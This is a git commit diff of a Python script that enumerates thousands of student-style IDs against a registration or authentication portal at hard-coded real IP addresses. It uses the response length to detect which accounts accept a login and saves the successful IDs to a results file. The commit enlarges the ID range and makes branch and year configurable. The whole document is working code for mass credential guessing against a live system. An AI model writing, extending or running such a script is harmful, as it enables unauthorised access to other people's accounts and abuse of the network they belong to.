b72a3f7aca1a0bb81993cd20a9dc26113abf9701
Rishav Rungta <rishav394@gmail.com>
2019-07-31 18:44:42 +0530

    Updated <3

--- main.py
+++ main.py
@@ -2,12 +2,18 @@ import os
 
 import bs4
 import requests
+from colorama import init
 
-base_url = 'http://115.248.50.60/registration/Main.jsp?sessionId=1&wispId=1'
+ip = '136.233.9.110'
+base_url = 'http://'+ip+'/registration/Main.jsp?sessionId=1&wispId=1'
+auth_url = 'http://'+ip + '/registration/chooseAuth.do'
+branch = 'BCE'
+year = '19'
+fruits = list(range(2000, 3000))
 
 headers = {
     'User-Agent':
-        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36'
+    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36'
 }
 
 
@@ -19,14 +25,18 @@ def is_password_correct(id):
         'submit': 'Login'
     }
 
-    res = requests.post("http://115.248.50.60/registration/chooseAuth.do", data=data, headers=headers,
-                        verify=False);
-    soup = bs4.BeautifulSoup(res.text, "html.parser")
-    findings: bs4.element.Tag = soup.font
-    final = (str(findings.contents[-1])).__len__()
-    if final == 38:
-        return True
-    else:
+    try:
+        res = requests.post(auth_url, data=data, headers=headers,
+                            verify=False)
+        soup = bs4.BeautifulSoup(res.text, "html.parser")
+        findings: bs4.element.Tag = soup.font
+        final = (str(findings.contents[-1])).__len__()
+        if final == 38:
+            return True
+        else:
+            return False
+    except:
+        print(f"\033[41m{my_id} Error! \033[0m")
         return False
 
 
@@ -34,19 +44,21 @@ source_code = requests.get(base_url, headers=headers, verify=False)
 
 headers.update({"Cookie": "JSESSIONID=" + source_code.cookies["JSESSIONID"]})
 
-fruits = range(2383, 2420)
-
+init()
 print("Execution Started")
-for x in fruits:
-    my_id = '18BCE' + str(x)
-    if is_password_correct(my_id):
-        try:
-            os.mkdir('Results')
-        except OSError:
-            pass
+try:
+    os.mkdir('Results')
+except OSError:
+    pass
 
-        with open("Results/BCE.txt", "a") as my_file:
+for x in fruits:
+    my_id = year + branch + str(x).zfill(4)
+    if is_password_correct(my_id):
+        print(f"\033[34m{my_id} Success! \033[0m")
+        with open("Results/"+branch+".txt", "a") as my_file:
             my_file.write(my_id + "\n")
             my_file.close()
+    else:
+        print(f"\033[31m{my_id} Fails! \033[0m")
 
 print("Execution Stopped")
